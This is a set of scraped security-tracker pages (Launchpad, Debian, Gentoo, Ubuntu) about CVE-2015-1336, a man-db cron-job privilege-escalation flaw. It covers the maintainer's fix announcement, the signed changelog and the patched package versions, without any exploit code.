@serge-hallyn: The fix for the reported bug was entirely in man-db (see comment #15), although it was a combination of upstream and packaging work. The apport, pam, and shadow tasks were spun off by @sarnold; the pam/shadow tasks are explained in comment #2.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Benjamin Drung (bdrung)](https://launchpad.net/~bdrung) wrote on 2022-11-09: |  |  | [#20](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/comments/20) |
| --- | --- | --- | --- |

The apport lock file permission was addressed in [bug #1862348](/bugs/1862348).

The apport lock file permission was addressed in bug #1862348.

| Changed in apport (Ubuntu): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/man-db/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
50c26bf
([Get the code!](https://dev.launchpad.net/))



=== Content from security-tracker.debian.org_d0fbb843_20250126_010632.html ===

# CVE-2015-1336

| **Name** | CVE-2015-1336 |
| --- | --- |
| **Description** | The daily mandb cleanup job in Man-db before 2.7.6.1-1 as packaged in Ubuntu and Debian allows local users with access to the man account to gain privileges via vectors involving insecure chown use. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2015-1336) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-1336); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2015-1336), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2015-1336), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2015-1336), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2015-1336), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-1336), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2015-1336), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2015-1336), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2015-1336)/[CVE](https://www.suse.com/security/cve/CVE-2015-1336/), GitHub [advisories](https://github.com/advisories?query=CVE-2015-1336)/[code](https://github.com/search?type=Code&q=%22CVE-2015-1336%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2015-1336%22), [web search](https://duckduckgo.com/html?q=%22CVE-2015-1336%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [840357](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=840357) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [man-db](/tracker/source-package/man-db) ([PTS](https://tracker.debian.org/pkg/man-db)) | bullseye | 2.9.4-2 | fixed |
|  | bookworm | 2.11.2-2 | fixed |
|  | sid, trixie | 2.13.0-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [man-db](/tracker/source-package/man-db) | source | (unstable) | 2.7.6-1 |  |  | [840357](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=840357) |

## Notes

```
[jessie] - man-db <no-dsa> (Minor issue)
[wheezy] - man-db <no-dsa> (Minor issue)
[squeeze] - man-db <no-dsa> (Not exploitable in practice)
<http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>
[https://bugs.launchpad.net/ubuntu/+source/man-db/+bug/1482786](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786)

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from security.gentoo.org_1281f2f1_20250124_122600.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# MAN DB: Privilege escalation — GLSA **201707-12**

A vulnerability in MAN DB allows local users to gain root
privileges.

### Affected packages

| Package | **sys-apps/man-db** on all architectures |
| --- | --- |
| Affected versions | < **2.7.6.1-r2** |
| Unaffected versions | >= **2.7.6.1-r2** |

### Background

MAN DB is a man replacement that utilizes BerkelyDB instead of flat
files.

### Description

The /var/cache/man directory as part of the MAN DB package has group
permissions set to root.

### Impact

A local user who does not belong to the root group, but has the ability
to modify the /var/cache/man directory can escalate privileges to the
group root.

### Workaround

There is no known workaround at this time.

### Resolution

All MAN DB users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=sys-apps/man-db-2.7.6.1-r2:0"

```
### References

* [CVE-2015-1336](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2015-1336)

**Release date**

July 09, 2017

**Latest revision**

August 06, 2017: 2

**Severity**

high

**Exploitable**

local

**Bugzilla entries**

* [602588](https://bugs.gentoo.org/show_bug.cgi?id=602588)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from bugs.debian.org_bb6ceae7_20250124_122558.html ===

# Debian Bug report logs - #840357 CVE-2015-1336

[![version graph](version.cgi?width=2;fixed=man-db%2F2.7.6-1;package=man-db;absolute=0;collapse=1;found=man-db%2F2.7.5-1;height=2)](version.cgi?package=man-db;found=man-db%2F2.7.5-1;info=1;absolute=0;fixed=man-db%2F2.7.6-1;collapse=1)

Package:
[man-db](pkgreport.cgi?package=man-db);
Maintainer for [man-db](pkgreport.cgi?package=man-db) is [Colin Watson <cjwatson@debian.org>](pkgreport.cgi?maint=cjwatson%40debian.org); Source for [man-db](pkgreport.cgi?package=man-db) is [src:man-db](pkgreport.cgi?src=man-db) ([PTS](https://tracker.debian.org/pkg/man-db), [buildd](https://buildd.debian.org/man-db), [popcon](https://qa.debian.org/popcon.php?package=man-db)).

Reported by: [Moritz Muehlenhoff <jmm@debian.org>](pkgreport.cgi?submitter=jmm%40debian.org)

Date: Mon, 10 Oct 2016 21:33:02 UTC

Severity: important

Tags: security

Found in version man-db/2.7.5-1

Fixed in version man-db/2.7.6-1

**Done:** Colin Watson <cjwatson@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=840357;mbox=yes), [status mbox](bugreport.cgi?bug=840357;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=840357;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Colin Watson <cjwatson@debian.org>`:

`Bug#840357`; Package `man-db`.
(Mon, 10 Oct 2016 21:33:04 GMT) ([full text](bugreport.cgi?bug=840357;msg=2), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Moritz Muehlenhoff <jmm@debian.org>`:

New Bug report received and forwarded. Copy sent to `team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Colin Watson <cjwatson@debian.org>`.
(Mon, 10 Oct 2016 21:33:04 GMT) ([full text](bugreport.cgi?bug=840357;msg=4), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=840357;msg=5), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=jmm%40debian.org)
From: Moritz Muehlenhoff <jmm@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: CVE-2015-1336
Date: Mon, 10 Oct 2016 23:31:16 +0200
```
Package: man-db
Version: 2.7.5-1
Severity: important
Tags: security

Please see
<http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>

Cheers,
        Moritz

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org`:

`Bug#840357`; Package `man-db`.
(Sun, 11 Dec 2016 16:48:05 GMT) ([full text](bugreport.cgi?bug=840357;msg=7), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Colin Watson <cjwatson@debian.org>`:

Extra info received and forwarded to list.
(Sun, 11 Dec 2016 16:48:05 GMT) ([full text](bugreport.cgi?bug=840357;msg=9), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 840357@bugs.debian.org ([full text](bugreport.cgi?bug=840357;msg=10), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=cjwatson%40debian.org)
From: Colin Watson <cjwatson@debian.org>
To: Moritz Muehlenhoff <jmm@debian.org>, 840357@bugs.debian.org,
1482786@bugs.launchpad.net
Subject: man-db setgid-root and recursive-chown-cron-job vulnerabilities
Date: Sun, 11 Dec 2016 16:45:26 +0000
```
Apologies for my long delay in dealing with these bugs, both reported by
halfdog.  Fixes turned out to be quite complicated, since in part they
involved unwinding incorrect logic from nearly 20 years ago and ensuring
that everything else built on that was appropriately adjusted.

Here are the relevant sections from my release announcement, which
should appear at
<https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html>
in the near future:

  * SECURITY: Eliminate dangerous setgid-root directories.  In the default
    configuration, cache files and directories are now owned by man:man
    rather than man:root; man and mandb are now setgid man as well as
    setuid man (except in the --disable-setuid case).  This is a much
    simpler and safer solution to the original problem that caused my
    predecessor to make directories setgid root, and doesn't introduce any
    interesting new privilege since the man group's only real purpose is
    to be the man user's primary group and nothing in cache directories is
    group-writeable.

    Maintainers of distribution packagers should take care to review their
    installation rules in light of this change.

    As far as I know this has no CVE ID, but it is described here:

      <http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/>

  [...]

  Notes for distributors
  ======================

  The security fix above was quite involved.  If you're trying to backport
  it to a stable release, then you should probably consider at least these
  commits:

    e62b9edafe00c51e52863718cb2eb1e29385230e Rename some anomalous x* functions
    9ab9f3dd9b0d5f290c635995559332c1710e5b4d man(1): Fix gcc warnings
    0f8b5518949866075c25787bdc4e9c064597c21e Separate cache owner from --enable-setuid option
    94b9d1e2a14ce8790d7c73df00d0bbd9e40cd437 Handle cleanup stack more safely
    c7f7daa9b2ffbbf4c45a2b168802a51acc2263c0 Make --disable-cache-owner imply --disable-setuid
    31552334cecee82809059ec598a37d9ea82683f0 Eliminate dangerous setgid-root directories
    755a9551c45da82f99d0ad8e46ef756afbeafb3f Fix distcheck following cache-owner/setuid changes
    75701f7fd9a00108abeb851792231b3d9bc2a67d Fix systemd tmpfiles group/perms of /var/cache/man

  Feel free to contact me if you have difficulty.  You should also
  consider
  <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>,
  which could not be fixed without fixing the above bug first; while this
  bug was in Debian-specific cron jobs, others may have copied them.

I've uploaded 2.7.6-1 to unstable with fixes for these vulnerabilities.
I'd be happy to help out the Debian and Ubuntu security teams with
backports if they need it, although hopefully the above list of git
commits is enough to get started.

--
Colin Watson                                       [cjwatson@debian.org]

```

---

**Reply sent**
to `Colin Watson <cjwatson@debian.org>`:

You have taken responsibility.
(Sun, 11 Dec 2016 17:06:19 GMT) ([full text](bugreport.cgi?bug=840357;msg=12), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=12), [link](#11)).

---

**Notification sent**
to `Moritz Muehlenhoff <jmm@debian.org>`:

Bug acknowledged by developer.
(Sun, 11 Dec 2016 17:06:19 GMT) ([full text](bugreport.cgi?bug=840357;msg=14), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=14), [link](#13)).

---

[Message #15](#15) received at 840357-close@bugs.debian.org ([full text](bugreport.cgi?bug=840357;msg=15), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=15), reply):

![](/cgi-bin/libravatar.cgi?email=cjwatson%40debian.org)
From: Colin Watson <cjwatson@debian.org>
To: 840357-close@bugs.debian.org
Subject: Bug#840357: fixed in man-db 2.7.6-1
Date: Sun, 11 Dec 2016 17:03:51 +0000
```
Source: man-db
Source-Version: 2.7.6-1

We believe that the bug you reported is fixed in the latest version of
man-db, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 840357@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Colin Watson <cjwatson@debian.org> (supplier of updated man-db package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Format: 1.8
Date: Sun, 11 Dec 2016 16:27:19 +0000
Source: man-db
Binary: man-db
Architecture: source
Version: 2.7.6-1
Distribution: unstable
Urgency: medium
Maintainer: Colin Watson <cjwatson@debian.org>
Changed-By: Colin Watson <cjwatson@debian.org>
Description:
 man-db     - on-line manual pager
Closes: [813665](bugreport.cgi?bug=813665) [840357](bugreport.cgi?bug=840357)
Changes:
 man-db (2.7.6-1) unstable; urgency=medium
 .
   * New upstream release:
     - Note that "man -K" searches page source (closes: #[813665](bugreport.cgi?bug=813665)).
     - SECURITY: Eliminate dangerous setgid-root directories.
     - man now understands the <page>.<section> form on its command line, so
       for example 'man chmod.2' is now the same as 'man 2 chmod'.
   * Adjust various bits of packaging to account for changed ownership and
     permissions of /usr/bin/man, /usr/bin/mandb, and /var/cache/man.
   * SECURITY: Remove recursive chown of /var/cache/man from cron.daily job,
     which introduced a vulnerability and is no longer needed now that man-db
     is more careful about ensuring appropriate ownership of its cache files
     (closes: #[840357](bugreport.cgi?bug=840357), LP: #1482786).
Checksums-Sha1:
 9506519ae5b29f353f1b230c249146b93018e984 2012 man-db_2.7.6-1.dsc
 35a10f80d5cf6411d5c73376fcddcec1539e788a 1541288 man-db_2.7.6.orig.tar.xz
 6e7f67a37e208da9e63d319a289f0ff56eace11d 257884 man-db_2.7.6-1.debian.tar.xz
Checksums-Sha256:
 0ed464a4bbcab998150dea9ae2cc08740787059088af850f15d2b4446b732251 2012 man-db_2.7.6-1.dsc
 c68cffa6b93f6362beb1d1259f9ad5b65af2aee9a7d9910086082ea4b75f5da2 1541288 man-db_2.7.6.orig.tar.xz
 142f09add127f9b6ff1373c18c2ed7c5ab085734a7b02a950d0237aa387932bd 257884 man-db_2.7.6-1.debian.tar.xz
Files:
 2240affefb0adec02af793c6bc7d60f7 2012 doc important man-db_2.7.6-1.dsc
 e0aa460ab00b047f3784d70ae8ccfcab 1541288 doc important man-db_2.7.6.orig.tar.xz
 1e506856b4d35ca013e5e70051442d7d 257884 doc important man-db_2.7.6-1.debian.tar.xz

-----BEGIN PGP SIGNATURE-----
Comment: Colin Watson <cjwatson@debian.org> -- Debian developer

iQIzBAEBCAAdFiEErApP8SYRtvzPAcEROTWH2X2GUAsFAlhNgSAACgkQOTWH2X2G
UAt4ow//avGdgedG/34/fxBaEQrxFPXlvv2sq03Tq1qQCm3Z19DY3sDlp6/LMl06
4XXDrM7B/sxk/tDUy3djidyrEXNDNC+d2YYOWlF4CN/+7zPt6Gg5FzJg4lBFawOy
l7WL8QUB7qRtXao7Vdsub1hVZVj/l7jge6vYbkJ+4+NfZ2XXs1s5ITtbKJrq7jI+
UCpgNDJIs+B1AlAB3CYyAuJZl+dJudi2S4OCcSsE8eLxRQsDi2tsjCyXS0qGiPPf
ClWMXELByhXzetQraRt3vjsWmQY3KfXo5GScZ9ZdOmI2eSt42L4yVcCto43hAgL3
XmsGfJPtgHxkuKJq5935uOuF01zooK3ETuDWvZRYMkJdOP8gtBK6yc+olahJq7Ky
cQyOUdK767Ofal7IP4xLVnpTyJ/X7EJmvJyHUGuXNU4DmuauwRFvmpfChTKz2HMW
yGcbmdXpnCnsUVe2D9U0jsI3cFpriPJM0nDABiwCkZTlM0e+X/yrnzJWZk1ywoiK
ouvknT31hV9c+wpz1lGg56tcFskgszTWZq5XoEJrZfqwY6/3e2FzD71yp5NePbYJ
iTn3FW1JiuT4WslDYA9GTMYWVRqIFxLEUAVgM0+OgoYpy2nFXuGRUTLKpXk6wnN8
jw9X7pM7S1BSOw63FrcD6K/FHhyoLzG8PE51j3C67N+6k8vCQAI=
=xHt8
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Wed, 07 Nov 2018 07:37:33 GMT) ([full text](bugreport.cgi?bug=840357;msg=17), [mbox](bugreport.cgi?bug=840357;mbox=yes;msg=17), [link](#16)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=840357).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Fri Jan 24 12:25:58 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from launchpad.net_77f08c07_20250126_010620.html ===

[Log in / Register](https://launchpad.net/bugs/cve/CVE-2015-1336/%2Blogin)

![](/@@/launchpad-logo)

## Launchpad.net

* [Launchpad Home](https://launchpad.net/)
* [Code](https://code.launchpad.net/)
* [Bugs](https://bugs.launchpad.net/)
* [Blueprints](https://blueprints.launchpad.net/)
* [Translations](https://translations.launchpad.net/)
* [Answers](https://answers.launchpad.net/)

[Launchpad CVE tracker](/bugs/cve)
# CVE 2015-1336

The daily mandb cleanup job in Man-db before 2.7.6.1-1 as packaged in Ubuntu and Debian allows local users with access to the man account to gain privileges via vectors involving insecure chown use.

## Related bugs and status

CVE-2015-1336 (Candidate)
is related to these bugs:

**[Bug #1482786: man-db daily cron job TOCTOU bug when processing catman pages](https://bugs.launchpad.net/bugs/1482786)**

| Summary | | | | In | Importance | Status |
| --- | --- | --- | --- | --- | --- | --- |
|  | 1482786 | [man-db daily cron job TOCTOU bug when processing catman pages](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786) |  | man-db (Ubuntu) | High | Fix Released |
|  | 1482786 | [man-db daily cron job TOCTOU bug when processing catman pages](https://bugs.launchpad.net/ubuntu/%2Bsource/apport/%2Bbug/1482786) |  | apport (Ubuntu) | Undecided | Fix Released |
|  | 1482786 | [man-db daily cron job TOCTOU bug when processing catman pages](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1482786) |  | shadow (Ubuntu) | Undecided | Confirmed |
|  | 1482786 | [man-db daily cron job TOCTOU bug when processing catman pages](https://bugs.launchpad.net/ubuntu/%2Bsource/pam/%2Bbug/1482786) |  | pam (Ubuntu) | Undecided | Confirmed |

See the ![](/@@/link)
[CVE page on Mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1336)
for more details.

## Related bugs

* [#1482786:
  man-db daily cron job TOCTOU bug when processing catman pages](https://bugs.launchpad.net/bugs/1482786)

* [Link to bug](%2Blinkbug)
* [Remove bug link](%2Bunlinkbug)

## References

* MLIST:
  [[oss-security] 2015121...](http://www.openwall.com/lists/oss-security/2015/12/14/11)
* MISC:
  [http://packetstormsecu...](http://packetstormsecurity.com/files/140759/Man-db-2.6.7.1-Privilege-Escalation.html)
* MISC:
  [http://people.canonica...](http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1336.html)
* MISC:
  [http://www.halfdog.net...](http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/)
* MISC:
  [https://bugs.launchpad...](https://bugs.launchpad.net/ubuntu/%2Bsource/man-db/%2Bbug/1482786)
* CONFIRM:
  [https://bugs.debian.or...](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=840357)
* GENTOO:
  [GLSA-201707-12](https://security.gentoo.org/glsa/201707-12)
* BID:
  [79723](http://www.securityfocus.com/bid/79723)

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from people.canonical.com_4b6a1a84_20250124_122556.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2015-1336

Publication date 28 September 2017

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/03ac6f86-CVE-Priority-icon-Low.svg)

**Low**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg)

**7.8 · High**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Severity score breakdown](#impact-score)
* [References](#references)

The daily mandb cleanup job in Man-db before 2.7.6.1-1 as packaged in
Ubuntu and Debian allows local users with access to the man account to gain
privileges via vectors involving insecure chown use.

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| man-db | 24.10 oracular | Not affected |
| 24.04 LTS noble | Not affected |
| 23.10 mantic | Not affected |
| 23.04 lunar | Not affected |
| 22.10 kinetic | Not affected |
| 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Not affected |
| 20.04 LTS focal | Not affected |
| 19.10 eoan | Not affected |
| 19.04 disco | Not affected |
| 18.10 cosmic | Not affected |
| 18.04 LTS bionic | Not affected |
| 17.10 artful | Not affected |
| 17.04 zesty | Not affected |
| 16.10 yakkety | Ignored end of life |
| 16.04 LTS xenial | Fixed 2.7.5-1ubuntu0.1~esm1   [Ubuntu Pro  Fix available with Ubuntu Pro and Ubuntu Pro (Infra-only) via ESM Infra.](/pro) |
| 15.10 wily | Ignored end of life |
| 15.04 vivid | Ignored end of life |
| 14.04 LTS trusty | Ignored end of ESM support, was needed |
| 12.04 LTS precise | Ignored end of life |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)

### Get expanded security coverage with Ubuntu Pro

Reduce your average CVE exposure time from 98 days to 1 day with expanded CVE patching, ten-years security maintenance and optional support for the full stack of open-source applications. Free for personal use.

[Get Ubuntu Pro](/pro)

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 7.8 · High |
| Attack vector | Local |
| Attack complexity | Low |
| Privileges required | Low |
| User interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity impact | High |
| Availability impact | High |
| Vector | CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1336)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-1336)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2015-1336)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2015-1336)

### Related Ubuntu Security Notices (USN)

+ [USN-5334-1](https://usn.ubuntu.com/USN-5334-1)
+ man-db vulnerability
+ 17 March 2022

### Other references

* <http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/>
* <https://lists.nongnu.org/archive/html/man-db-announce/2016-12/msg00000.html>
* <https://www.cve.org/CVERecord?id=CVE-2015-1336>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

